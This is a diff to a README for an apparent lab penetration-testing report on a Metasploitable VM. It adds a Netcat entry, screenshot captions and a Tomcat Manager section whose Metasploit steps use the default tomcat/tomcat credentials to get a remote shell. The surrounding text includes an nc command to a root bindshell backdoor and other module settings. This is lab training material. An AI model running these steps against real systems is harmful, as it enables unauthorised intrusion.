@@ -13,6 +13,7 @@ The aim of this project was to perform a thorough vulnerability assessment on Me
 ## Tools Used
 - Nmap: Carried out network exploration and port scanning in order to uncover available services and possible access points.
 - Metasploit Framework: Utilizing pre-built modules and custom scripts to exploit identified vulnerabilities for more thorough penetration testing.
+- Netcat: Access into bindshell bakdoor using netcat (nc) command.
 
 ## Steps to Reproduce
 
@@ -24,6 +25,7 @@ Steps:
 - Run exploit to access a backdoor shell.
 
 ![image](https://github.com/user-attachments/assets/ac76dde2-c328-4f6f-a043-42296e768b17)
+FTP Backdoor
 
 ### Unsecured Telnet Service 
 Module Used: auxiliary/scanner/telnet/telnet_login
@@ -50,6 +52,7 @@ Steps:
 - set PASS_FILE "Password file location"
 
 ![image](https://github.com/user-attachments/assets/3cffafe0-c023-4e80-beb9-38086223897b)
+Outdated SSH Version
 
 ### Samba Unauthenticated Access
 Module Used: auxiliary/scanner/ssh/ssh_login
@@ -58,11 +61,13 @@ Steps:
 - Execute the exploit to open a remote shell via Samba misconfiguration.
 
 ![image](https://github.com/user-attachments/assets/be1303d3-5c8b-48e3-ab5c-f0a671ea4b01)
+Samba Unauthenticated Access
 
 ### Bindshell Backdoor (Metasploitable root shell)
 - nc 192.168.0.103 1524
 
 ![image](https://github.com/user-attachments/assets/11345c83-8e97-48a5-8ded-d23e1d0bbef6)
+Bindshell Backdoor
 
 ### IRC Backdoor (UnrealIRCd)
 - Module Used: exploit/unix/irc/unreal_ircd_3281_backdoor
@@ -91,6 +96,7 @@ Apache (CGI Argument Injection)
 2.	Execute payload to gain shell access.
 
 ![image](https://github.com/user-attachments/assets/d182e0cc-70bb-4668-add4-2d8185301b10)
+Remote code Execution on Java RMI
 
 ### Unencrypted VNC Connection
 - Module Used: auxiliary/scanner/vnc/vnc_login
@@ -104,6 +110,18 @@ Apache (CGI Argument Injection)
 
 vncviewer 192.168.0.103 and password is "password" as you can see from previous screenshot.
 ![image](https://github.com/user-attachments/assets/43a5357f-8bae-4173-8fdd-87b876b31f8b)
+
+### Tomcat Manager RCE
+- Module Used: exploit/multi/http/tomcat_mgr_upload
+- Steps:
+1.	set HttpUsername tomcat
+2.	set HttpPassword tomcat
+3.	set RPORT 8081
+4.	set RHOST 
+5.	Execute the exploit to obtain a remote shell.
+
+![image](https://github.com/user-attachments/assets/a840412c-2101-42e4-8786-7bdead7f8b1e)
+Tomcat Manager RCE
 
 
 
